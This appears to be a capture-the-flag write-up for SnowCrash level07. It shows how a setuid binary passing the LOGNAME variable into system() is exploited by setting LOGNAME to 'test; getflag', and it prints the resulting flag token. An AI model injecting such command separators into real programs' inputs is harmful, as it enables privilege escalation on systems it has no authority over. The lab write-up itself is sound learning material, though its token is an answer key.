# Level07

The binary prints our username. Lets have a look at the binary:
```shell
level07@SnowCrash:~$ strings level07`
/bin/echo %s 
;*2$
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff804, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                            = 2007
geteuid()                                                                                                            = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
getenv("LOGNAME")                                                                                                    = "level07"
asprintf(0xbffff754, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)                                                  = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 0
```

We can spot the `getenv("LOGNAME")` is loaded to get our username so we can probably change it:
```shell
level07@SnowCrash:~$ export LOGNAME=test
level07@SnowCrash:~$ ./level07 
test
```
It works, lets now try to inject some code:
```shell
level07@SnowCrash:~$ export LOGNAME="test; getflag"
level07@SnowCrash:~$ ./level07 
test
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```